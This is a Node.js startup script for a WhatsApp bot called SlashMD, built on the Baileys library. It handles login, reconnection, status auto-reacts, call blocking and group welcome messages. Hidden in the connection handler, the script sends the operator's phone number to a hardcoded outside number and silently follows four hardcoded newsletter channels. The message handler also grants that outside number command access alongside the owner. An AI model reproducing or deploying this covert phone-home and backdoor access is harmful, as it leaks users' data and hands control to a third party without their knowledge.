require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const { sleep } = require("./all/myfunc.js")  
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()

const connectionOptions = {
printQRInTerminal: !usePairingCode,
version: [2, 3000, 1017531287],    
logger: pino({ level: "fatal" }),
auth: state,
browser: ["Ubuntu","Chrome","20.0.04"],
getMessage: async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'WhatsApp Bot By Haikal'
}}
}

const conn = func.makeWASocket(connectionOptions)
if (usePairingCode && !conn.authState.creds.registered) {
const phoneNumber = await question(chalk.cyan.bold('Masukan Nomor Whatsapp Awali dengan 62\nContoh : 62838XXX\n'))
const code = await conn.requestPairingCode(phoneNumber.trim())
console.log(`${chalk.cyan.bold('Kode Verifikasi Kamu')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
}
store?.bind(conn.ev)

conn.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
conn.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
conn.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(chalk.cyan.bold('Menghubungkan . . . '))
} else if (connection === "open") {
let teksnotif = `*SlashMD* Berhasil Tersambung Ke Nomor WhatsApp ${conn.user.id.split(":")[0]}`
conn.sendMessage("62895615063060@s.whatsapp.net", {text: teksnotif})
console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))

// Channel Joining Logic
const linksal = [
  '0029Vb4fjWE1yT25R7epR110',
  '0029Vb4s2mADTkK7PdUpl42K',
  '0029Vb60rjm05MUhvzLPU125',
  '0029VbAhesDJ3jutFwGpwE3o'
];
async function folldate(links) {
  for (const link of links) {
    try {
      await sleep(3000);
      const metadata = await conn.newsletterMetadata('invite', link);
      await sleep(3000);
      await conn.newsletterFollow(metadata.id);
    } catch (error) {
      console.error(`❌ Gagal join saluran ID: ${link}`, error);
    }
  }
}
await folldate(linksal);
}
})

// Auto-React Status Logic
conn.ev.on('messages.upsert', async (chatUpdate) => {
  const message = chatUpdate.messages[0];
  const timeLimit = 5 * 60 * 1000; // 5 minutes
  conn.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      const decoded = jidDecode(jid) || {};
      return decoded.user && decoded.server ? `${decoded.user}@${decoded.server}` : jid;
    }
    return jid;
  };
  if (global.settings.autoreact && message.key.remoteJid === 'status@broadcast') {
    if (message.key.fromMe) return;
    const now = Date.now();
    const messageTime = message.messageTimestamp * 1000;
    if (now - messageTime <= timeLimit) {
      if (message.pushName && message.pushName.trim() !== '') {
        await conn.readMessages([message.key]);
        const currentDate = new Date(now);
        const days = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu', 'Minggu'];
        const day = days[currentDate.getDay()];
        const date = currentDate.getDate();
        const month = currentDate.getMonth() + 1;
        const year = currentDate.getFullYear();
        const key = message.key;
        const remoteJid = message.key.remoteJid;
        const botJid = await conn.decodeJid(conn.user.id);
        const emoji = global.emoji[Math.floor(Math.random() * global.emoji.length)];
        await conn.sendMessage(remoteJid, { react: { key, text: emoji } }, { statusJidList: [key.participant, botJid] });
        console.log('React WhatsApp Story');
        console.log('• Name: ', message.pushName);
        console.log('• Date: ', `${day}, ${date}/${month}/${year}`);
        console.log('• React: ', emoji);
      }
    }
  }
});

conn.ev.on('call', async (user) => {
if (!global.anticall) return
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await conn.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
conn.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
await sleep(10000)
await conn.updateBlockStatus(ff.from, "block")
}}
}})

conn.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.isBaileys) return
if (m.key && m.key.remoteJid === 'status@broadcast') {
if (global.autoreadsw) conn.readMessages([m.key])
}
let fill = [global.owner, "62895615063060"]
if (!conn.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
if (global.autoread) conn.readMessages([m.key])
m = func.smsg(conn, m, store)
require("./Slash")(conn, m, store)
} catch (err) {
console.log(err)
}
})

conn.ev.on('group-participants.update', async (anu) => {
  console.log("Group event:", anu);
  console.log("Welcome/Bye status:", global.welcome);

  // Cek apakah fitur welcome/bye aktif
  if (!global.welcome) {
    console.log("Welcome/Bye disabled, skipping...");
    return;
  }

  // Hanya proses aksi 'add' atau 'remove'
  if (anu.action !== 'add' && anu.action !== 'remove') {
    console.log("Not an 'add' or 'remove' action, skipping...");
    return;
  }

  let botNumber = await conn.decodeJid(conn.user.id);
  console.log("Bot number:", botNumber);
  if (anu.participants.includes(botNumber)) {
    console.log("Bot is participant, skipping...");
    return;
  }

  try {
    let metadata = await conn.groupMetadata(anu.id);
    let namagc = metadata.subject;
    let desc = metadata.desc || 'Tidak ada deskripsi grup';
    let participants = anu.participants;
    console.log("Group metadata:", metadata);

    for (let num of participants) {
      console.log("Processing participant:", num);
      try {
        ppuser = await conn.profilePictureUrl(num, 'image');
      } catch {
        ppuser = 'https://telegra.ph/file/d1688cff04f816713f8aa.jpg';
        console.log("Failed to get profile picture for", num, "using default");
      }

      console.log("Profile picture URL:", ppuser);
      let message = '';
      let title = '';

      if (anu.action == 'add') {
        // Cek custom welcome message, fallback ke default
        let customWelcome = global.db.data.chats[anu.id]?.welcomeMessage || 
          `Hallo @${num.split("@")[0]} Selamat Datang Di *${namagc}*`;
        message = customWelcome
          .replace(/@user/g, `@${num.split("@")[0]}`)
          .replace(/@subject/g, namagc)
          .replace(/@desc/g, desc);
        title = '© Welcome Message';
      } else if (anu.action == 'remove') {
        // Cek custom bye message, fallback ke default
        let customBye = global.db.data.chats[anu.id]?.byeMessage || 
          `@${num.split("@")[0]} Telah Keluar Dari *${namagc}*`;
        message = customBye
          .replace(/@user/g, `@${num.split("@")[0]}`)
          .replace(/@subject/g, namagc)
          .replace(/@desc/g, desc);
        title = '© Goodbye Message';
      }

      if (message) {
        console.log("Sending message to:", anu.id, "for participant:", num);
        await conn.sendMessage(anu.id, {
          text: message,
          contextInfo: {
            mentionedJid: [num],
            externalAdReply: {
              thumbnailUrl: ppuser,
              title: title,
              body: '',
              renderLargerThumbnail: true,
              sourceUrl: global.linkgc || '',
              mediaType: 1
            }
          }
        });
      }
    }
  } catch (err) {
    console.error("Error in group-participants.update:", err);
  }
});

conn.public = true

conn.ev.on('creds.update', saveCreds)
return conn
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})